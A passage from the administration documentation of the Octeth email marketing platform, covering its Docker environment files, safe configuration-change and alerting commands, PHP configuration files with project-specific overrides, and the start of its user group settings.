The MySQL root password is only used internally by Docker containers. Your application connects using the credentials in `.oempro_env`.
:::

#### `.oempro_redis_env` - Redis Configuration

Configures Redis, which provides high-speed caching for improved performance.

**Location:** `/opt/octeth/.oempro_redis_env`

**Configuration:**
```bash
HOSTNAME=oempro_redis              # Redis container hostname
```

#### `.oempro_rabbitmq_env` - RabbitMQ Configuration

Configures RabbitMQ, the message queue system that handles asynchronous tasks like email delivery, journey processing, and background jobs.

**Location:** `/opt/octeth/.oempro_rabbitmq_env`

**Configuration:**
```bash
HOSTNAME=oempro_rmq                          # RabbitMQ container hostname
RABBITMQ_ERLANG_COOKIE=oempro-rmq            # Erlang cluster cookie
RABBITMQ_VM_MEMORY_HIGH_WATERMARK=1024MiB    # Memory limit before throttling
RABBITMQ_DEFAULT_USER=oempro                 # RabbitMQ username
RABBITMQ_DEFAULT_PASS=password               # RabbitMQ password
RABBITMQ_DEFAULT_VHOST=oempro_rmq_vhost      # Virtual host name
```

::: tip Performance Tuning
Increase `RABBITMQ_VM_MEMORY_HIGH_WATERMARK` if you're processing high-volume email campaigns. For servers with 16GB RAM, you can set this to `4096MiB` or higher.
:::

#### `.oempro_clickhouse_env` - ClickHouse Configuration

Configures ClickHouse, the analytics database used for reporting and high-volume event tracking.

**Location:** `/opt/octeth/.oempro_clickhouse_env`

**Configuration:**
```bash
CLICKHOUSE_DB=oempro               # ClickHouse database name
CLICKHOUSE_USER=oempro             # ClickHouse username
CLICKHOUSE_PASSWORD=password       # ClickHouse password
```

#### `.oempro_supervisor_env` - Supervisor Configuration

Configures Supervisor, the process control system that manages background workers and ensures they restart automatically if they fail.

**Location:** `/opt/octeth/.oempro_supervisor_env`

**Configuration:**
```bash
SUPERVISOR_USERNAME=oempro         # Supervisor web interface username
SUPERVISOR_PASSWORD=password       # Supervisor web interface password
```

### Laravel Backend: `system/.env`

The Laravel backend handles modern PHP 8.1+ features including API endpoints, webhooks, and advanced system operations.

**Location:** `/opt/octeth/system/.env`

**Key Configuration:**
```bash
APP_NAME=Octeth                              # Application name
APP_ENV=local                                # Environment: local, staging, production
APP_KEY=base64:j54qtJlSJjSTkPXk...          # Laravel encryption key (auto-generated)
APP_DEBUG=false                              # Enable debug mode
APP_URL=http://localhost                     # Application URL

# Database (should match main .oempro_env)
DB_CONNECTION=mysql
DB_HOST=192.168.99.108
DB_PORT=3306
DB_DATABASE=oempro
DB_USERNAME=oempro
DB_PASSWORD=password
DB_TABLE_PREFIX=oempro_system_               # Different prefix for Laravel tables

# RabbitMQ Connection
OEMPRO_RABBITMQ_HOST=oempro_rmq
OEMPRO_RABBITMQ_PORT=5672
OEMPRO_RABBITMQ_USERNAME=oempro
OEMPRO_RABBITMQ_PASSWORD=password
OEMPRO_RABBITMQ_VHOST=oempro_rmq_vhost

# ClickHouse Connection
CLICKHOUSE_HOST=192.168.99.114
CLICKHOUSE_DB=oempro
CLICKHOUSE_USER=oempro
CLICKHOUSE_PASSWORD=password
```

::: info Laravel vs CodeIgniter
Octeth uses a hybrid architecture. The main application runs on CodeIgniter (PHP 5.6 compatible), while the `system/` directory contains a Laravel application (PHP 8.1+) for modern features. Both share the same MySQL database but use different table prefixes.
:::

### Email Campaign Controller: `cli/email_campaign_controller/.env`

Controls the email delivery system's concurrency and performance settings.

**Location:** `/opt/octeth/cli/email_campaign_controller/.env`

**Configuration:**
```bash
MAXSENDERSPERCAMPAIGN=15           # Maximum parallel senders per campaign
MAXSENDERSPERSERVER=150            # Maximum parallel senders per delivery server
```

**Understanding the Settings:**

- **MAXSENDERSPERCAMPAIGN**: Controls how many simultaneous SMTP connections are used for a single campaign. Higher values speed up delivery but increase server load.

- **MAXSENDERSPERSERVER**: Controls how many total SMTP connections can be active on a single delivery server. This prevents overwhelming your SMTP servers.

::: tip Delivery Performance
For high-volume sending (1M+ emails/hour):
- Set `MAXSENDERSPERCAMPAIGN=25`
- Set `MAXSENDERSPERSERVER=200`

For shared SMTP servers or rate-limited providers:
- Set `MAXSENDERSPERCAMPAIGN=5`
- Set `MAXSENDERSPERSERVER=50`
:::

### Best Practices for Environment Files

**Security:**
1. Never commit `.env` files to version control (Git, SVN, etc.)
2. Store backups in encrypted, secure locations
3. Use strong, unique passwords for all services
4. Change default passwords immediately after installation
5. Restrict file permissions: `chmod 600 /opt/octeth/.oempro*_env`

**Consistency:**
1. Database credentials must match across all environment files
2. Keep IP addresses and hostnames consistent
3. Update both `.oempro_env` and `system/.env` when changing database settings

**Documentation:**
1. Document any changes you make to environment files
2. Keep a changelog of configuration modifications
3. Note the reason for any non-standard settings

**Testing:**
1. Test configuration changes in a staging environment first
2. Always create backups before modifying environment files
3. Verify system health after changes using `/opt/octeth/cli/octeth.sh health:check`

### Common Configuration Scenarios

#### Scenario 1: Changing the Application URL

When you set up a domain name or move to a new IP address:

1. Update `.oempro_env`:
   ```bash
   APP_URL=https://octeth.yourdomain.com/
   ```

2. Update `system/.env`:
   ```bash
   APP_URL=https://octeth.yourdomain.com
   ```

3. Restart Docker containers:
   ```bash
   cd /opt/octeth
   /opt/octeth/cli/octeth.sh docker:restart
   ```

#### Scenario 2: Enabling Production Mode

When moving from staging to production:

1. Update `.oempro_env`:
   ```bash
   APP_ENV=production
   OEMPRO_DEBUG=false
   OEMPRO_LOG_LEVEL=ERROR
   SESSION_SECURE_COOKIE=true        # Only if using HTTPS
   ```

2. Update `system/.env`:
   ```bash
   APP_ENV=production
   APP_DEBUG=false
   ```

3. Clear caches and restart:
   ```bash
   cd /opt/octeth
   /opt/octeth/cli/octeth.sh cache:flush '*'
   /opt/octeth/cli/octeth.sh docker:restart
   ```

#### Scenario 3: Optimizing for High-Volume Sending

For sending millions of emails:

1. Update `cli/email_campaign_controller/.env`:
   ```bash
   MAXSENDERSPERCAMPAIGN=25
   MAXSENDERSPERSERVER=200
   ```

2. Update `.oempro_rabbitmq_env`:
   ```bash
   RABBITMQ_VM_MEMORY_HIGH_WATERMARK=4096MiB
   ```

3. Update `.oempro_env`:
   ```bash
   CAMPAIGN_DELIVERY_LOG_LEVEL=WARNING    # Reduce log verbosity
   ```

4. Restart affected services:
   ```bash
   /opt/octeth/cli/octeth.sh backend:restart
   ```

#### Scenario 4: Enabling Debug Mode for Troubleshooting

When investigating issues:

1. Update `.oempro_env`:
   ```bash
   OEMPRO_DEBUG=true
   OEMPRO_LOG_LEVEL=DEBUG
   SENDENGINE_LOG_LEVEL=DEBUG           # Send-engine controller detail
   API_SLOW_QUERY_THRESHOLD=0.5         # Log slow API calls
   ```

2. Update `system/.env`:
   ```bash
   APP_DEBUG=true
   LOG_MYSQL_QUERIES=true
   ```

3. Monitor logs:
   ```bash
   /opt/octeth/cli/octeth.sh logs:tail
   ```

::: danger Remember to Disable Debug Mode
Debug mode can expose sensitive information and reduce performance. Always disable it after troubleshooting:
```bash
OEMPRO_DEBUG=false
OEMPRO_LOG_LEVEL=ERROR
```
:::

### Viewing Current Configuration

To view your current environment configuration:

```bash
# View main configuration
cat /opt/octeth/.oempro_env

# View MySQL configuration
cat /opt/octeth/.oempro_mysql_env

# View RabbitMQ configuration
cat /opt/octeth/.oempro_rabbitmq_env

# View all environment files
ls -la /opt/octeth/.oempro*_env
```

To see what a setting does and what a change to it needs, ask the key registry:

```bash
/opt/octeth/cli/octeth.sh env:describe CAMPAIGN_DELIVERY_LOG_LEVEL
```

It prints who reads the key, what to run after changing it, whether it is a secret, the value shipped in `_dockerfiles/examples/.oempro_env.example`, the code default and the value on this install. The value of a secret key (passwords, salts, tokens, API keys and webhook URLs that carry a token) is never printed: the command only says whether it is set.

| Read by | After changing the key |
|---|---|
| `app` (web and API requests) | Nothing. The next request reads it. |
| `worker` (background workers and cron scripts) | `./cli/octeth.sh backend:restart` |
| `sendengine` | `./cli/octeth.sh sendengine:restart` |
| `system` (Laravel backend) | `docker restart oempro_system` |
| `ui` (new user interface) | `docker restart oempro_ui` |
| `compose` (Docker Compose or a container entrypoint) | `docker compose up -d --force-recreate` for the service that reads it |
| `proxy` (HAProxy, Caddy) | `docker compose up -d --force-recreate haproxy link_proxy` |
| `cli` (`./cli/octeth.sh` only) | Nothing. The next command reads it. |

A key read by several of them needs each restart. `MCP_ENABLED` and `MCP_DISCOVERY_ENABLED` are the exception: they need `docker compose up -d --force-recreate oempro_ui haproxy`.

### Editing Environment Files

To safely edit environment files:

```bash
# Create a backup first
cp /opt/octeth/.oempro_env /opt/octeth/.oempro_env.backup

# Edit the file using vi or nano
vi /opt/octeth/.oempro_env

# After making changes, restart Docker containers
cd /opt/octeth
/opt/octeth/cli/octeth.sh docker:restart

# Verify system health
/opt/octeth/cli/octeth.sh health:check
```

::: warning Configuration File Format
Environment files use a simple `KEY=value` format. Important rules:
- No spaces around the `=` sign
- No parentheses `()` or equal signs `=` in comments
- Quote values with spaces: `APP_NAME="My Company"`
- Comments start with `#`
- Empty values are allowed: `SENTRY_API=`
- `/opt/octeth/cli/octeth.sh env:validate .oempro_env` also warns about a key that Octeth does not know, which is usually a typo. The warning names the key and never prints its value, and it does not fail the check.
:::

### Changing `.oempro_env` Safely: env:plan, env:apply, env:rollback

Change `.oempro_env` with these three commands rather than by editing the file. They read the key registry in `_dockerfiles/examples/.oempro_env.example` (`@reader`, `@secret`, `@restart`) to work out which containers a change needs restarted. No `.oempro_env` key was added, removed or changed for them.

- `/opt/octeth/cli/octeth.sh env:plan KEY=VALUE ...` prints the change (old and new values, secrets shown only as "(changed)") and the exact restarts it needs. It writes nothing.
- `/opt/octeth/cli/octeth.sh env:apply KEY=VALUE ...` takes the same input, checks it again, saves a snapshot of `.oempro_env` in `data/env_snapshots/` (readable only by its owner), writes the file, runs only the restarts the plan named and records the change in the configuration change log (`oempro_config_changes`, with secrets masked).
- `/opt/octeth/cli/octeth.sh env:rollback [SNAPSHOT]` restores a snapshot (the newest by default) and restarts what the restored keys need. `env:rollback --list` lists the snapshots. The newest 20 are kept.

Input: `KEY=VALUE` arguments, `--file FILE` or `--stdin` (one `KEY=VALUE` per line) and `--unset KEY`. A key marked secret in the registry (passwords, salts, `LICENSE_KEY`, `ADMIN_API_KEY` and the like) is accepted only from `--file` or `--stdin`, never as an argument, so it never lands in shell history, and its value is never printed or logged. A key the registry does not know is refused, which catches typos.

`env:apply` and `env:rollback` stop and ask for `--yes` when a campaign is sending (or Octeth cannot tell), or when the change force-recreates containers (for example `MCP_ENABLED`, or a resource limit read by Docker Compose), because recreating containers drops sessions and pauses sending for a moment.

Example, rotating a secret and changing the log level:

```bash
printf 'LICENSE_KEY=%s\nOEMPRO_LOG_LEVEL=INFO\n' "$NEW_KEY" | /opt/octeth/cli/octeth.sh env:apply --stdin
```

An AI assistant connected through the built-in connector can never read or change `.oempro_env` or restart a container. These commands are for an operator, or a local agent such as Claude Code, working on the server itself.

### Operator Alerts: alerts:*

Octeth raises its own alerts with no AI agent running. Add a rule on the server:

```bash
/opt/octeth/cli/octeth.sh alerts:add --metric=complaint_rate --threshold=0.1 --email=ops@example.com
echo "https://api.telegram.org/bot<token>/sendMessage?chat_id=<chat>" | /opt/octeth/cli/octeth.sh alerts:add --metric=worker_down --threshold=0 --webhook-stdin
```

Metrics: `complaint_rate`, `bounce_rate`, `delivery_server_failure_rate` (percent over `--window` minutes, default 60), `queue_depth`, `worker_down`, `disk_usage`. For `complaint_rate` and `bounce_rate`, email gateway messages are counted over the window. Campaign and autoresponder sends are stored per UTC day, so their bounces and complaints are counted from the start of the same UTC day: each rate compares events with the sends of the same period. A rate needs at least 200 messages before it can fire.

`--cooldown` (minutes, default 60) is the quiet time after an alert. A webhook URL is read from stdin only, because it can carry a token, and it is never shown again. `alerts:list`, `alerts:events`, `alerts:enable`, `alerts:disable`, `alerts:remove`, `alerts:test ID` and `alerts:check [--dry-run]` manage and exercise the rules. The check runs every five minutes from cron (`cli/operator_alerts.php` in `oempro_cron`).

## System Configuration Part II: Configuration Files

While environment variables control system-level settings, configuration files provide detailed, structured PHP-based configuration for Octeth's features and behaviors. These files allow you to customize everything from SMS settings to email delivery parameters without modifying core application code.

Configuration files are automatically loaded at startup and can be overridden on a per-project basis, making them ideal for multi-tenant deployments or custom implementations.

### What Are Configuration Files?

Configuration files are PHP files that return arrays of key-value pairs. Octeth automatically loads these files and makes their values available throughout the application as constants or global variables.

**Location:** `/opt/octeth/config/`

**Two Main Types:**

1. **Constants Files** (`const_*.php`) - Define PHP constants (immutable values)
2. **Configuration Files** (other `.php` files) - Define scalar constants or global array variables

### Directory Structure

The config directory is organized into two main subdirectories:

```
/opt/octeth/config/
├── global/                    # Global configuration (all environments)
│   ├── app.php               # Core application settings
│   ├── features.php          # Feature flags and toggles
│   ├── sms.php               # SMS system configuration
│   ├── email_delivery.php    # Email delivery settings
│   ├── const_*.php           # Constant definitions
│   └── ...                   # Other config files
├── environments/             # Environment-specific overrides
│   ├── local/                # Local development settings
│   │   └── config.php
│   ├── staging/              # Staging environment settings
│   │   └── config.php
│   └── production/           # Production environment settings
│       └── config.php
└── .htaccess                 # Apache security rules
```

### Global Configuration Files

The `config/global/` directory contains configuration files that apply to all environments unless overridden.

| File Name                  | Purpose                              | Key Settings                                                          |
|----------------------------|--------------------------------------|-----------------------------------------------------------------------|
| `app.php`                  | Core application settings            | MySQL credentials, debugging, logging, session management             |
| `features.php`             | Feature flags and behavioral toggles | WYSIWYG editor, CRON settings, credit deductions, webhooks            |
| `sms.php`                  | SMS system configuration             | Link shortening, gateway settings, queue processing, delivery reports |
| `email_delivery.php`       | Email delivery parameters            | SMTP settings, bounce handling, delivery throttling                   |
| `dns.php`                  | DNS lookup and validation            | DNS servers, validation rules, timeout settings                       |
| `services.php`             | External service integrations        | Third-party API configurations                                        |
| `session.php`              | User session management              | Session lifetime, storage, security settings                          |
| `cookie.php`               | Cookie configuration                 | Cookie names, domains, security flags                                 |
| `ui.php`                   | User interface settings              | UI themes, layouts, display options                                   |
| `sender_domain_dns.php`    | Sender domain DNS requirements       | SPF, DKIM, DMARC validation rules                                     |
| `event_tracker.php`        | Website event tracking               | Tracking pixel settings, event mapping                                |
| `custom_field_presets.php` | Predefined custom field templates    | Common custom field configurations                                    |
| `timezones.php`            | Timezone definitions                 | Supported timezones for the system                                    |
| `tiny_mce.php`             | Rich text editor configuration       | TinyMCE toolbar settings, plugins                                     |

### Constants Files (`const_*.php`)

Files prefixed with `const_` define PHP constants that cannot be changed during runtime. These are used for system-wide immutable values.

| File Name                                 | Purpose                         |
|-------------------------------------------|---------------------------------|
| `const_BOUNCE_PATTERNS.php`               | Email bounce detection patterns |
| `const_EMAILGATEWAY_TO_CC_BCC_LIMITS.php` | Email gateway recipient limits  |
| `const_METRIC_WEIGHTS.php`                | Engagement scoring weights      |
| `const_OEMPRO_DNS_LOOKUP_SERVERS.php`     | DNS servers for lookups         |
| `const_OEMPRO_REDIS_PARAMETERS.php`       | Redis connection parameters     |
| `const_OEMPRO_SERVICE_HOSTNAMES.php`      | Internal service hostnames      |
| `const_OPEN_BOT_IP_RANGES.php`            | IP ranges used to flag automated/bot email opens |
| `const_WEBSITE_EVENT_MAPPING.php`         | Website event type mappings     |

::: info How Configuration Files Work
When Octeth starts, configuration files are loaded in the following order. Since PHP constants can only be defined once, the **first file to define a value wins**:

1. Environment variables are loaded first (`.oempro_env`, `system/.env`, etc.)
2. Priority global config files are loaded (`app.php`)
3. If `APP_PROJECT_CONFIG_PATH` is set, project-specific configs are loaded (see [Project-Specific Configuration Overrides](#project-specific-configuration-overrides))
4. Core environment-specific configs from `config/environments/{APP_ENV}/` are loaded
5. Core global configs from `config/global/` are loaded
6. Scalar values become PHP constants, array values are stored in `$GLOBALS`

Because project configs load before core configs, project overrides take precedence over core defaults.
:::

### Environment-Specific Configuration

The `config/environments/` directory allows you to override global settings based on the current environment (local, staging, production).

**How It Works:**

1. The environment is determined by the `APP_ENV` variable in `.oempro_env`
2. Octeth loads the corresponding directory: `config/environments/{APP_ENV}/`
3. Files in this directory override global settings with the same keys

**Example: Production-Specific Settings**

Create `/opt/octeth/config/environments/production/config.php`:

```php
<?php

return [
    'OEMPRO_DEBUG' => false,
    'OEMPRO_LOG_LEVEL' => 'ERROR',
    'MYSQL_ERRORS_ON_SCREEN' => false,
];
```

When `APP_ENV=production` is set in `.oempro_env`, these values override the defaults from `config/global/app.php`.

::: tip Environment-Based Configuration
Use environment-specific configs for:
- Different debug levels per environment
- Environment-specific API endpoints
- Different cache TTL values
- Testing vs production feature flags
:::

### How to Edit Configuration Files

Configuration files are PHP files that return arrays. Follow these steps to safely modify them:

1. **Create a backup:**
   ```bash
   cp /opt/octeth/config/global/features.php /opt/octeth/config/global/features.php.backup
   ```

2. **Edit the file:**
   ```bash
   vi /opt/octeth/config/global/features.php
   ```

3. **Modify values in the returned array:**
   ```php
   <?php

   return [
       'WYSIWYG_ENABLED' => true,  // Change from false to true
       'DEMO_MODE_ENABLED' => false,
       // ... other settings
   ];
   ```

4. **Validate PHP syntax:**
   ```bash
   php -l /opt/octeth/config/global/features.php
   ```

5. **Restart Docker containers:**
   ```bash
   cd /opt/octeth
   /opt/octeth/cli/octeth.sh docker:restart
   ```

6. **Verify system health:**
   ```bash
   /opt/octeth/cli/octeth.sh health:check
   ```

::: warning PHP Syntax
Configuration files must return a valid PHP array. Common mistakes:
- Missing semicolon at end of lines
- Unclosed brackets or parentheses
- Incorrect boolean values (`true/false` not `"true"/"false"` strings)
- Missing commas between array elements
:::

### Project-Specific Configuration Overrides

Octeth supports project-specific configuration overrides using the `APP_PROJECT_CONFIG_PATH` environment variable. This allows custom configuration without modifying core files, and is ideal for:

- White-label installations requiring specific configurations
- Custom deployments with tailored feature flags or settings
- Testing configuration changes without modifying core files

**How It Works:**

1. Set `APP_PROJECT_CONFIG_PATH` in `.oempro_env` to point to your project config directory
2. Create `global/` and/or `environments/{APP_ENV}/` subdirectories inside that path
3. Add PHP config files that return arrays of key-value pairs
4. Only include the settings you want to override — no need to copy entire files

::: danger Critical: Path Must Be Relative
`APP_PROJECT_CONFIG_PATH` must be a **relative path** from the Octeth installation root (`/opt/octeth/`). The system automatically prepends the application root path.

```bash
# Correct — relative path
APP_PROJECT_CONFIG_PATH=.engage/config

# Wrong — absolute path (will be double-prefixed and fail silently)
APP_PROJECT_CONFIG_PATH=/opt/octeth/.engage/config
```
:::

**Expected Directory Structure:**

The path set in `APP_PROJECT_CONFIG_PATH` must contain `global/` and/or `environments/` subdirectories directly:

```
/opt/octeth/{APP_PROJECT_CONFIG_PATH}/
├── global/                              # Applied to all environments
│   ├── features.php
│   └── const_custom.php
└── environments/
    └── production/                      # Applied only when APP_ENV=production
        └── engage.php
```

**Loading Priority (highest to lowest):**

Since PHP constants can only be defined once, the **first file to define a value wins**. After the priority files (like `app.php`), the config loader processes files in this order:

| Priority | Source | Path |
|----------|--------|------|
| 1 | Priority files (core) | `/opt/octeth/config/global/app.php` |
| 2 | Project environment constants | `{PROJECT_PATH}/environments/{APP_ENV}/const_*.php` |
| 3 | Project environment configs | `{PROJECT_PATH}/environments/{APP_ENV}/*.php` |
| 4 | Project global constants | `{PROJECT_PATH}/global/const_*.php` |
| 5 | Project global configs | `{PROJECT_PATH}/global/*.php` |
| 6 | Core environment constants | `/opt/octeth/config/environments/{APP_ENV}/const_*.php` |
| 7 | Core environment configs | `/opt/octeth/config/environments/{APP_ENV}/*.php` |
| 8 | Core global constants | `/opt/octeth/config/global/const_*.php` |
| 9 | Core global configs | `/opt/octeth/config/global/*.php` |

Because project configs (priorities 2–5) load before core configs (priorities 6–9), project values take precedence.

::: warning Filename-Based Deduplication
The config loader tracks loaded files **by filename**. If the same filename exists in multiple locations, only the first one encountered is loaded. For example, if `engage.php` exists in both `environments/production/` and `global/` within the project path, only the environment-specific version loads. The global version is skipped because a file named `engage.php` was already processed.
:::

### Example: Creating a Project-Specific Configuration

Create a custom configuration for a project called "engage":

**Step 1: Create the project directory structure**

```bash
mkdir -p /opt/octeth/.engage/config/global
mkdir -p /opt/octeth/.engage/config/environments/production
```

**Step 2: Set APP_PROJECT_CONFIG_PATH**

Edit `/opt/octeth/.oempro_env` and add:

```bash
APP_PROJECT_CONFIG_PATH=.engage/config
```

This resolves to `/opt/octeth/.engage/config/` internally.

**Step 3: Create a global configuration file**

Create `/opt/octeth/.engage/config/global/features.php`:

```php
<?php

return [
    'WYSIWYG_ENABLED' => true,
    'DISPLAY_CREDIT_NOTICE' => false,
    'WEBHOOK_TIMEOUT_SECONDS' => 15,
];
```

These values apply to all environments and override the defaults from core config files.

**Step 4: Create environment-specific overrides**

Create `/opt/octeth/.engage/config/environments/production/settings.php`:

```php
<?php

return [
    'OEMPRO_LOG_LEVEL' => 'WARNING',
    'SESSION_SECURE_COOKIE' => true,
];
```

These values only apply when `APP_ENV=production` is set in `.oempro_env`.

**Step 5: Verify and restart**

Validate PHP syntax, then restart Octeth:

```bash
php -l /opt/octeth/.engage/config/global/features.php
php -l /opt/octeth/.engage/config/environments/production/settings.php
/opt/octeth/cli/octeth.sh docker:restart
```

Verify the configuration loaded correctly:

```bash
/opt/octeth/cli/octeth.sh config:list
```

The resulting directory structure should look like this:

```
/opt/octeth/.engage/
└── config/
    ├── global/
    │   └── features.php
    └── environments/
        └── production/
            └── settings.php
```

::: tip Project Directory Naming
Use a leading dot (`.`) for project directories to keep them hidden from casual directory listings:
- `.engage` instead of `engage`
- `.acme-corp` instead of `acme-corp`
:::

### Best Practices for Configuration Files

**Organization:**
1. Only override settings that need to be changed (don't copy entire files)
2. Keep project-specific configs minimal and well-documented
3. Use comments to explain why specific values were chosen
4. Group related settings together

**Version Control:**
1. **Never commit** sensitive credentials in config files
2. Use environment variables (`.oempro_env`) for secrets
3. Config files can be version-controlled since they reference environment variables via `SystemConfig::Get()`
4. Use `.gitignore` for project-specific directories

**Documentation:**
1. Document all custom configuration overrides
2. Add comments explaining non-obvious settings
3. Keep a changelog of configuration changes
4. Note dependencies between related settings

**Testing:**
1. Always validate PHP syntax after editing: `php -l filename.php`
2. Test configuration changes in staging before production
3. Create backups before making changes
4. Use environment-specific configs to test different values

**Maintenance:**
1. Review and clean up unused configuration overrides
2. Update project configs when upgrading Octeth versions
3. Periodically audit configuration for security best practices
4. Monitor logs after configuration changes

### Common Configuration Scenarios

#### Scenario 1: Enabling WYSIWYG Editor Globally

To enable the rich text editor for all users:

1. Edit `/opt/octeth/config/global/features.php`:
   ```php
   'WYSIWYG_ENABLED' => true,  // Changed from false
   ```

2. Restart Docker:
   ```bash
   /opt/octeth/cli/octeth.sh docker:restart
   ```

#### Scenario 2: Customizing SMS Link Settings

To use shorter SMS links with a custom domain:

1. Edit `/opt/octeth/config/global/sms.php`:
   ```php
   'SMS_LINK_SHORT_CODE_LENGTH' => 4,           // Shorter URLs
   'SMS_LINK_DOMAIN' => 'sms.yourdomain.com',   // Custom domain
   'SMS_LINK_EXPIRY_HOURS_DEFAULT' => 168,      // 7 days instead of 3
   ```

2. Validate and restart:
   ```bash
   php -l /opt/octeth/config/global/sms.php
   /opt/octeth/cli/octeth.sh docker:restart
   ```

#### Scenario 3: Creating a White-Label Configuration

For a white-label client who needs custom settings:

1. Set up project path in `.oempro_env`:
   ```bash
   APP_PROJECT_CONFIG_PATH=.whitelabel-client
   ```

2. Create project config directory:
   ```bash
   mkdir -p /opt/octeth/.whitelabel-client/config/global
   ```

3. Create `/opt/octeth/.whitelabel-client/config/global/features.php`:
   ```php
   <?php

   return [
       'OCTETH_TRACKERS' => false,              // Remove Octeth branding
       'DISABLE_LATEST_NEWS' => true,           // No Octeth news
       'DISPLAY_CREDIT_NOTICE' => false,        // Hide credit warnings
       'DISPLAY_LIMIT_NOTICE' => false,         // Hide limit warnings
   ];
   ```

4. Restart and verify:
   ```bash
   /opt/octeth/cli/octeth.sh docker:restart
   /opt/octeth/cli/octeth.sh health:check
   ```

#### Scenario 4: Environment-Specific Debug Settings

Different debug levels for different environments:

1. Create `/opt/octeth/config/environments/local/config.php`:
   ```php
   <?php

   return [
       'OEMPRO_DEBUG' => true,
       'OEMPRO_LOG_LEVEL' => 'DEBUG',
       'MYSQL_ERRORS_ON_SCREEN' => true,
       'LOG_MYSQL_QUERIES' => true,
   ];
   ```

2. Create `/opt/octeth/config/environments/production/config.php`:
   ```php
   <?php

   return [
       'OEMPRO_DEBUG' => false,
       'OEMPRO_LOG_LEVEL' => 'ERROR',
       'MYSQL_ERRORS_ON_SCREEN' => false,
       'LOG_MYSQL_QUERIES' => false,
   ];
   ```

3. The correct settings will be used based on `APP_ENV` in `.oempro_env`

#### Scenario 5: Customizing Email Delivery Behavior

To adjust campaign delivery performance:

1. Edit `/opt/octeth/config/global/email_delivery.php` (each key falls back to an
   `.oempro_env` override via `SystemConfig::Get()`, so you can also set these in
   `.oempro_env` instead of editing the config file):
   ```php
   'BATCH_SIZE' => 100,                  // Recipients processed per queue batch
   'BATCH_INTERVAL_SIZE' => 100,         // Emails retrieved per interval within a batch
   'BOUNCE_PROCESSING_THREADS' => 10,    // IMAP threads for bounce/FBL processing
   'EG_WORKER_BATCH_SIZE' => 50,         // Emails processed per Email Gateway worker batch
   ```

2. Restart backend workers:
   ```bash
   /opt/octeth/cli/octeth.sh backend:restart
   ```

### Viewing Current Configuration

To view the current values from configuration files:

```bash
# View global features
cat /opt/octeth/config/global/features.php

# View SMS configuration
cat /opt/octeth/config/global/sms.php

# List all global config files
ls -la /opt/octeth/config/global/

# List environment-specific configs
ls -la /opt/octeth/config/environments/production/

# Check if project config is set
grep "APP_PROJECT_CONFIG_PATH" /opt/octeth/.oempro_env
```

### Troubleshooting Configuration Issues

**Configuration changes not taking effect:**

1. Verify PHP syntax is valid:
   ```bash
   php -l /opt/octeth/config/global/features.php
   ```

2. Ensure you restarted Docker containers:
   ```bash
   /opt/octeth/cli/octeth.sh docker:restart
   ```

3. Check for environment-specific overrides:
   ```bash
   cat /opt/octeth/config/environments/production/config.php
   ```

4. Verify project config path is correct:
   ```bash
   grep "APP_PROJECT_CONFIG_PATH" /opt/octeth/.oempro_env
   ```

**PHP syntax errors:**

If you see a blank screen or 500 error after editing:

1. Check Docker logs:
   ```bash
   /opt/octeth/cli/octeth.sh logs:tail
   ```

2. Validate PHP syntax:
   ```bash
   php -l /opt/octeth/config/global/features.php
   ```

3. Restore from backup:
   ```bash
   cp /opt/octeth/config/global/features.php.backup /opt/octeth/config/global/features.php
   /opt/octeth/cli/octeth.sh docker:restart
   ```

**Project config not loading:**

1. Verify `APP_PROJECT_CONFIG_PATH` is set:
   ```bash
   cat /opt/octeth/.oempro_env | grep APP_PROJECT_CONFIG_PATH
   ```

2. Check directory exists and has correct structure:
   ```bash
   ls -la /opt/octeth/.acme-corp/config/
   ```

3. Ensure file permissions are correct:
   ```bash
   chmod -R 644 /opt/octeth/.acme-corp/config/*.php
   ```

::: danger Configuration File Security
Configuration files can execute arbitrary PHP code. Never:
- Download config files from untrusted sources
- Copy-paste configuration code without reviewing it
- Allow users to upload configuration files
- Store passwords or API keys directly in config files (use environment variables instead)
:::

## User Group Settings

User groups are the foundation of Octeth's multi-tenancy system. Each user group acts as an isolated environment with its own settings, limits, permissions, and branding. When you create a user account in Octeth, it must belong to a user group.

Think of user groups as different "tiers" or "plans" for your users. For example, you might create separate user groups for:

- Free users with limited features
- Premium users with higher sending limits
- Agency clients with custom branding
- Internal team members with full access

To access user group settings, navigate to **Administrator Dashboard** → **Users** → **User Groups**.

### Basic Information

**Group Name**
The name of this user group. This is shown in the administrator area when managing user accounts. Choose a descriptive name like "Free Plan", "Premium Tier", or "Agency Client".

**Subscriber Area Logout URL**
The URL where subscribers are redirected after they log out from the subscriber portal. Typically set to your website homepage or a goodbye page.

**User Area Logout URL**
The URL where users are redirected after they log out from the user dashboard. Can be set to your website or a custom landing page.

### User Interface & Branding

**Template**
The UI theme template to use for this user group. Octeth comes with the "weefive" template by default.

**Product Name**
The product name displayed throughout the user interface. You can rebrand Octeth to your own product name (e.g., "YourCompany Email Marketing").

**Theme CSS Settings**
Customize colors, fonts, and visual styling for this user group. Each template has different customization options available.

### Permissions

**Permissions Checkboxes**
Control which features and modules are accessible to users in this group. Permissions include:

- Lists - Create and manage subscriber lists
- Campaigns - Create and send email campaigns
- AutoResponders - Set up automated email sequences
- Segments - Create dynamic subscriber segments
- Forms - Create subscription forms
- APIs - Access API endpoints
- Integrations - Connect third-party services
- Reports - View statistics and analytics
- And many more...

Only enable permissions for features you want this user group to access.

### Account Limits

These limits control resource usage for users in this group. Set to `0` for unlimited (use with caution).

**Limit Subscribers**
Maximum number of subscribers users in this group can have across all their lists. For example, set to `10000` to allow up to 10,000 subscribers.

**Limit Lists**
Maximum number of subscriber lists users can create. For example, set to `5` to allow 5 lists.

**Limit Campaign Send Per Period**
Maximum number of campaign emails that can be sent per period (monthly). Controls bulk email sending capacity.

**Limit Email Send Per Period**
Maximum number of total emails (campaigns + transactional) that can be sent per period (monthly).

**Limit Email Send Per Day**
Maximum number of emails that can be sent in a 24-hour period. Useful for rate limiting.

**Limit Email Send Lifetime**
Total number of emails that can be sent over the entire lifetime of the account. Useful for prepaid plans.

**Limit Email Gateway Sender Domains**
Maximum number of sender domains users can add to the Email Gateway (transactional email) feature.

::: tip Setting Appropriate Limits
Start conservative and increase limits based on usage patterns. For new customers, consider:
- Free tier: 500 subscribers, 2 lists, 5,000 emails/month
- Starter tier: 2,500 subscribers, 5 lists, 25,000 emails/month
- Pro tier: 10,000 subscribers, unlimited lists, 100,000 emails/month
:::

### Usage Thresholds

**Threshold Import**
Percentage threshold (0-100) for import operations. When users reach this percentage of their subscriber limit, they receive a warning. For example, set to `80` to warn at 80% capacity.

**Threshold Email Send**
Percentage threshold (0-100) for email sending. Users are warned when they reach this percentage of their monthly email limit.

::: info Threshold Warnings
